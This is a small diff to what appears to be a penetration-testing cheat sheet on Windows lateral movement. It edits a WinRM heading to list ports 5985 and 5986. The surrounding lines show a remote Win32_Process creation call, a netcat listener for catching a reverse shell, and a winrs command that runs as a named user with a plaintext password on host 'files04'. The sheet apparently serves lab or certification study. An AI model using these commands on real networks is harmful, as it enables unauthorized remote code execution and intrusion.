@@ -215,7 +215,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 
 nc -lnvp 443
 ```
-###### Winrm(For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host)
+###### Winrm(domain user needs to be part of the Administrators or Remote Management Users group on the target host,5985,5986)
 ```
 Testing:
 winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
